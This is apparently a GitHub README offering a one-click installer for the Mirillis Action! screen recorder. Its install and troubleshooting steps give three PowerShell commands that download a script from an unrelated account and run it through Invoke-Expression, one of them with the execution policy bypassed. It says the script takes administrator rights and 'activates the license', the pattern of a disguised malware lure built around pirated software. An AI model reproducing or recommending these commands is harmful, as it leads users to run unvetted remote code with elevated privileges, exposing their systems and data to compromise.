# Action Screen Recorder Setup
One-click setup for Mirillis Action! -- the ultra-smooth 4K 120fps game and screen recorder with real-time hardware encoding and built-in live streaming to Twitch and YouTube.

## Install
Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does
- Requests administrator privileges for DirectX hook and GPU hardware encoder driver installation.
- Downloads Mirillis Action! installer silently and detects GPU for optimal hardware encoding settings.
- Configures Game capture mode with 4K resolution and 60fps as the default recording profile.
- Activates the license and opens Action! with the in-game HUD overlay ready for the first session.

## Requirements
- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~120 MB free disk space

## Troubleshooting

**Recording overlay does not appear inside fullscreen games**

Run Action! as Administrator and launch it before starting the game -- the DirectX hook must initialize first.

**Exported video has audio that gradually drifts out of sync with the video track**

Enable Synchronize audio and video in Action! Settings > Recording to prevent drift on recordings over 30 minutes.

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.